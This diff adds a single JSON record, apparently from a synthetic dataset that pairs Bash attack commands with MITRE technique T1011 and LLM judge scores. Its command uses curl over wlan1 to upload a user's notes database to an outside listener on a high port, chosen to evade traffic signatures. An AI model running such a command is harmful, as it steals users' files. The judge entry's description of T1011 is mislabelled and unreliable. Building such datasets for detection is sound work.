@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command with correct redirection, conditional execution, and valid curl flags and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "Although it plausibly exfiltrates a file over HTTP via a specified interface, it does not leverage trusted system scripts as a proxy and therefore does not align with the provided System Script Proxy Execution (T1011) description.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T21:17:59.512687Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
